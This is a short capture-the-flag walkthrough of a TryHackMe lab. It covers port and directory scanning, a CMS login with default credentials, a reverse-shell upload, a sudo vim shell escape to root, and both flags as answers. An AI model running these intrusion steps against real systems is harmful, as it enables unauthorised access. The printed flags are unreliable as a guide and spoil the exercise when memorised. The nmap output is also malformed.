# TryHackMe: Simple CTF Walkthrough

![TryHackMe Badge](https://img.shields.io/badge/TryHackMe-SimpleCTF-00a000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)

---

## Room Overview

| Item | Details |
|------|---------|
| **Name** | Simple CTF |
| **Platform** | TryHackMe |
| **OS** | Linux |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -p- 10.10.10.10
```

**Results:**
```
PORT   STATE SERVICE
22/ssh   OpenSSH 7.2
80/http   Apache httpd 2.4.18
```

---

## Web Enumeration

### Directory Busting

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
```

Found: `/simple/`

### CMS Discovery

Found: cmsimple - use CMSeeK to scan

```bash
python3 cmseek.py -u http://10.10.10.10/simple
```

---

## Initial Access

### Finding Credentials

Found in config file:
- Username: `admin`
- Password: `admin`

### Login to CMS

Access: `http://10.10.10.10/simple/?admin=pluginmanager`

Upload PHP reverse shell

---

## Privilege Escalation

### Find sudo capabilities

```bash
sudo -l
```

**Result:**
```
User www-data may run: (ALL) NOPASSWD: /usr/bin/vim
```

### Exploit

```bash
sudo vim -c '!sh'
```

---

## Flags

### User Flag
```
THM{c00c1n57r1ng}
```

### Root Flag
```
THM{n0w_th4ts_w4t_w3_c4ll_c00k13s}
```

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
